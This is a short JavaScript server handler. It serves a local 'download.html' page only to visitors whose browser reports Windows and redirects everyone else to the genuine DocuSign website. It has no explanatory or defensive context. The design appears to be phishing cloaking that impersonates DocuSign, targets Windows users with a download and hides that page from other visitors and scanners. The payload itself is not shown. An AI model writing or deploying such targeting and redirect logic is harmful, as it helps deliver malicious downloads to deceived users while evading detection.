import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  if (isWindows) {
    const filePath = path.join(process.cwd(), 'public', 'download.html');
    if (!fs.existsSync(filePath)) {
      res.status(404).send("HTML file not found");
      return;
    }

    const html = fs.readFileSync(filePath, 'utf-8');
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);

  } else {
    res.writeHead(302, { Location: 'https://www.docusign.com' });
    res.end();
  }
}
